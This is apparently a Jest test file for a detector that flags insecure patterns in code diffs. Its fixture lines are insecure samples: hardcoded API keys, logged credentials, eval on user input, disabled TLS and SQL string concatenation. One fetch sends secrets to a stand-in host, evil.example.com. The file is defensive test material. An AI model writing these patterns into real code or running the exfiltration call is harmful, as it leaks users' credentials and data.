/**
 * AI-code detectors + diff parser. Proves the unified-diff parser tracks
 * new-file line numbers (added lines only, minus removed), each CWE detector
 * fires on its real signature, and PRECISION: env refs/placeholders and benign
 * code do not produce findings.
 */
import { parseAddedLines, detectCodeFindings, reviewDiff } from "../detect";

const diff = (body: string) => `diff --git a/src/x.ts b/src/x.ts\n--- a/src/x.ts\n+++ b/src/x.ts\n${body}`;

test("parseAddedLines tracks new-file line numbers across a hunk", () => {
  const d = diff(`@@ -1,2 +1,4 @@\n context\n+added one\n-removed\n+added two\n more context`);
  const added = parseAddedLines(d);
  expect(added).toEqual([
    { file: "src/x.ts", line: 2, text: "added one" },
    { file: "src/x.ts", line: 3, text: "added two" },
  ]);
});

test("only ADDED lines are scanned (removed lines are ignored)", () => {
  const d = diff(`@@ -1,1 +1,1 @@\n-const k = "sk-ant-abcdefghijklmnopqrstuvwx0123";\n+const k = process.env.ANTHROPIC_KEY;`);
  expect(reviewDiff(d)).toEqual([]); // the secret was REMOVED, the added line is an env ref
});

test("detects a hardcoded secret (critical, CWE-798)", () => {
  const f = reviewDiff(diff(`@@ -1,0 +1,1 @@\n+const key = "sk-ant-abcdefghijklmnopqrstuvwx0123";`));
  expect(f).toHaveLength(1);
  expect(f[0]).toMatchObject({ klass: "secret", severity: "critical", cwe: "CWE-798" });
});

test("does NOT flag env refs / placeholders as secrets (precision)", () => {
  expect(reviewDiff(diff(`@@ -1,0 +1,1 @@\n+const api_key = process.env.API_KEY;`))).toEqual([]);
  expect(reviewDiff(diff(`@@ -1,0 +1,1 @@\n+const password = "your-password-here";`))).toEqual([]);
  expect(reviewDiff(diff(`@@ -1,0 +1,1 @@\n+const token = \`\${secretRef}\`;`))).toEqual([]);
});

test("detects a credential / reset link written to a log (blocks; CWE-532)", () => {
  // The motivating incident: a raw password reset link logged.
  const f = reviewDiff(diff("@@ -1,0 +1,1 @@\n+  console.log(`reset link: ${resetUrl}`);"));
  expect(f).toHaveLength(1);
  expect(f[0]).toMatchObject({ klass: "logged_credential", severity: "critical", cwe: "CWE-532" });
});

test("detects a provider-signature secret logged verbatim, and REDACTS the log finding", () => {
  // This line trips both the hardcoded-secret rule and the logged-secret rule;
  // assert the log finding specifically and that its snippet is redacted.
  const f = reviewDiff(diff('@@ -1,0 +1,1 @@\n+  console.error("key", "sk-ant-abcdefghijklmnopqrstuvwx0123");'));
  const logged = f.find((x) => x.klass === "logged_secret");
  expect(logged).toBeDefined();
  expect(logged).toMatchObject({ severity: "critical", cwe: "CWE-532" });
  expect(String(logged!.evidence.snippet)).not.toContain("sk-ant-abcdefghijklmnopqrstuvwx0123");
});

test("does NOT flag an ordinary log line as a logged credential (precision)", () => {
  expect(reviewDiff(diff('@@ -1,0 +1,1 @@\n+  console.log("token count", count);'))).toEqual([]);
});

test("detects eval/exec, disabled TLS, dangerous HTML, SQL concat", () => {
  const classes = (body: string) => reviewDiff(diff(`@@ -1,0 +1,1 @@\n+${body}`)).map((f) => f.klass);
  expect(classes(`eval(userInput);`)).toContain("eval_exec");
  expect(classes(`const a = { rejectUnauthorized: false };`)).toContain("disabled_tls");
  expect(classes(`el.innerHTML = userHtml;`)).toContain("dangerous_html");
  expect(classes("db.query(`SELECT * FROM users WHERE id = ${id}`);")).toContain("sql_concat");
});

test("detects weak randomness in a security context, open CORS, suppressed security, exfil", () => {
  const classes = (body: string) => reviewDiff(diff(`@@ -1,0 +1,1 @@\n+${body}`)).map((f) => f.klass);
  expect(classes(`const token = Math.random().toString(36);`)).toContain("weak_random");
  expect(classes(`res.setHeader("Access-Control-Allow-Origin", "*");`)).toContain("open_cors");
  expect(classes(`const x = run(); // nosec`)).toContain("suppressed_security");
  expect(classes(`fetch("https://evil.example.com/collect", { body: secrets });`)).toContain("exfil_network");
});

test("PRECISION: Math.random with no security context, internal fetch, benign code -> nothing", () => {
  const clean = (body: string) => reviewDiff(diff(`@@ -1,0 +1,1 @@\n+${body}`));
  expect(clean(`const jitter = Math.random() * 100;`)).toEqual([]);
  expect(clean(`await fetch("/api/dashboard");`)).toEqual([]);
  expect(clean(`fetch("http://localhost:3000/health");`)).toEqual([]);
  expect(clean(`export const sum = (a, b) => a + b;`)).toEqual([]);
});

test("detects an interactive auth / device-authorization flow (high, CWE-287)", () => {
  // Born from the 2026-10 incident: a looped auth CLI spamming device-auth prompts.
  const looped = reviewDiff(diff("@@ -1,0 +1,1 @@\n+until vercel ls --prod | grep Ready; do sleep 20; done"));
  expect(looped).toHaveLength(1);
  expect(looped[0]).toMatchObject({ klass: "interactive_auth", severity: "high", cwe: "CWE-287" });

  const classes = (body: string) => reviewDiff(diff(`@@ -1,0 +1,1 @@\n+${body}`)).map((f) => f.klass);
  // explicit device-flow logins a human must complete out of band
  expect(classes(`await exec("vercel login");`)).toContain("interactive_auth");
  expect(classes(`exec("gh auth login");`)).toContain("interactive_auth");
  expect(classes(`run("npm login");`)).toContain("interactive_auth");
  expect(classes(`exec("aws sso login --profile prod");`)).toContain("interactive_auth");
});

test("PRECISION: authenticated/non-interactive auth and a vercel.app URL are NOT flagged", () => {
  const classes = (body: string) => reviewDiff(diff(`@@ -1,0 +1,1 @@\n+${body}`)).map((f) => f.klass);
  // a token is present -> no interactive prompt -> not the consent-fatigue shape
  expect(classes(`until vercel ls --token $VERCEL_TOKEN | grep Ready; do sleep 5; done`)).not.toContain("interactive_auth");
  // "vercel" inside a hostname is not the CLI (the safe curl-poll pattern)
  expect(classes(`until curl -s https://x.vercel.app/api/version | grep -q sha; do sleep 15; done`)).not.toContain("interactive_auth");
  // a one-shot authenticated deploy is neither a loop nor an interactive login
  expect(classes(`vercel deploy --prod --token $VERCEL_TOKEN`)).not.toContain("interactive_auth");
  // an ordinary login UI string is not a CLI login command
  expect(classes(`const label = "Log in with GitHub";`)).not.toContain("interactive_auth");
});

test("detects a secret-named env var written to a log (high, CWE-532)", () => {
  // Found by adversarial dogfood: logging process.env.<SECRET> leaks the resolved
  // credential at runtime, and it passed every other detector.
  const classes = (body: string) => reviewDiff(diff(`@@ -1,0 +1,1 @@\n+${body}`)).map((f) => f.klass);
  expect(classes("console.log('jwt', process.env.INSTINCT_JWT_SECRET);")).toContain("logged_env_secret");
  expect(classes("logger.info(process.env.STRIPE_SECRET_KEY);")).toContain("logged_env_secret");
  expect(classes("console.error(`token=${process.env.GITHUB_TOKEN}`);")).toContain("logged_env_secret");
  const f = reviewDiff(diff("@@ -1,0 +1,1 @@\n+console.log(process.env.API_KEY);")).find((x) => x.klass === "logged_env_secret");
  expect(f).toMatchObject({ severity: "high", cwe: "CWE-532" });
});

test("PRECISION: a non-secret env log and USING (not logging) a secret are not flagged", () => {
  const clean = (body: string) => reviewDiff(diff(`@@ -1,0 +1,1 @@\n+${body}`)).filter((x) => x.klass === "logged_env_secret");
  expect(clean("console.log('port', process.env.PORT);")).toEqual([]); // not a secret-named var
  expect(clean("const key = process.env.STRIPE_SECRET_KEY;")).toEqual([]); // used, not logged
  expect(clean("console.log('user signed in', userId);")).toEqual([]); // ordinary log
});

test("a multi-file diff attributes findings to the right file", () => {
  const d = `diff --git a/a.ts b/a.ts\n--- a/a.ts\n+++ b/a.ts\n@@ -1,0 +1,1 @@\n+eval(x);\ndiff --git a/b.ts b/b.ts\n--- a/b.ts\n+++ b/b.ts\n@@ -1,0 +1,1 @@\n+const ok = 1;`;
  const f = detectCodeFindings(parseAddedLines(d));
  expect(f).toHaveLength(1);
  expect(f[0].file).toBe("a.ts");
});
